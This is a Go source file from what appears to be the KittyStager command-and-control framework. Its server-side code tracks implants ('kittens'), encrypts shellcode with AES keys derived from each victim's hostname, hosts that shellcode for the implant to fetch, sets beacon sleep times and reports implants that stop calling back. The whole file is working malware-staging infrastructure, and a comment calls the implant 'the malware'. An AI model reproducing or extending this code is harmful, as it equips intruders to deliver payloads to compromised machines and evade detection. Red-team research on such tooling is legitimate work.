package httpUtil

import (
	"KittyStager/cmd/cryptoUtil"
	"KittyStager/cmd/util"
	"encoding/json"
	"errors"
	"fmt"
	color "github.com/logrusorgru/aurora"
	"io/ioutil"
	"net/http"
	"time"
)

type Kitten struct {
	Name       string
	Payload    []byte
	Sleep      int
	Id         int
	LastSeen   time.Time
	InitChecks util.InitialChecks
	Alive      bool
}

var Targets map[string]*Kitten

// HostShellcode Hosts the shellcode
func HostShellcode(path string, kittenName string) error {
	var task util.Task
	var err error
	if Targets[kittenName].InitChecks.GetHostname() == "" {
		return errors.New("wait for the implant to call back")
	}
	key := cryptoUtil.GenerateKey(Targets[kittenName].InitChecks.GetHostname(), 32)
	sc, err := ioutil.ReadFile(path)
	contentType := http.DetectContentType(sc)
	//checks if the file is a hex file
	if contentType == "text/plain; charset=utf-8" {
		task = util.Task{Tag: "shellcode", Payload: sc}
		// check if the file is a binary
	} else if contentType == "application/octet-stream" {
		hexstring := fmt.Sprintf("%x ", sc)
		task = util.Task{Tag: "shellcode", Payload: []byte(hexstring)}

	}
	payload, _ := json.Marshal(task)
	shellcode, err := bytesToAES(payload, key)

	if err != nil {
		return err
	}
	fmt.Println(color.Green("[+] Key generated is : " + key))
	Targets[kittenName].SetPayload(shellcode)
	fmt.Println(color.Green("[+] shellcode hosted for " + kittenName))
	return error(nil)
}

// HostSleep Hosts the sleep time the same way as the shellcode
func HostSleep(t int, kittenName string) {
	Targets[kittenName].SetSleep(t)
	var task util.Task
	key := cryptoUtil.GenerateKey(Targets[kittenName].InitChecks.GetHostname(), 32)
	task = util.Task{Tag: "sleep", Payload: []byte(fmt.Sprintf("%d", t))}
	payload, _ := json.Marshal(task)
	sleep, _ := bytesToAES(payload, key)
	Targets[kittenName].SetPayload(sleep)
	fmt.Printf("%s %d%s %s%s\n", color.Green("[+] Sleep time set to"), color.Yellow(t), color.Yellow("s"), color.Green("on "), color.Yellow(kittenName))
}

// bytesToAES cypher the shellcode with AES
func bytesToAES(payload []byte, key string) ([]byte, error) {
	if len(key) != 32 {
		return nil, errors.New("the key needs to be 32 chars long")
	}
	byteKey := []byte(key)
	aesPayload, _ := cryptoUtil.Encrypt(payload, byteKey)
	return aesPayload, nil

}

// CheckAlive checks if the malware is alive. If last seen is longer that the sleep time it will...
func CheckAlive() {
	for {
		time.Sleep(1 * time.Second)
		for name, x := range Targets {
			if Targets[name].Alive {
				t := time.Now().Sub(x.GetLastSeen())
				sleepTime := time.Duration(x.GetSleep()) * time.Second
				if t > sleepTime+5*time.Second {
					Targets[name].SetAlive(false)
					fmt.Println(color.Red("\n[!] Kitten " + name + " died."))
				}
			}
		}
	}
}

func (K *Kitten) GetTarget() string {
	return K.Name
}

func (K *Kitten) GetPayload() []byte {
	return K.Payload
}

func (K *Kitten) SetPayload(sc []byte) {
	K.Payload = sc
}

func (K *Kitten) GetId() int {
	return K.Id
}

func (K *Kitten) SetId(id int) {
	K.Id = id
}

func (K *Kitten) GetLastSeen() time.Time {
	return K.LastSeen
}

func (K *Kitten) SetLastSeen(t time.Time) {
	K.LastSeen = t
}

func (K *Kitten) GetInitChecks() util.InitialChecks {
	return K.InitChecks
}

func (K *Kitten) SetInitChecks(c util.InitialChecks) {
	K.InitChecks = c
}

func (K *Kitten) GetSleep() int {
	return K.Sleep
}

func (K *Kitten) SetSleep(t int) {
	K.Sleep = t
}

func (K *Kitten) GetAlive() bool {
	return K.Alive
}

func (K *Kitten) SetAlive(b bool) {
	K.Alive = b
}
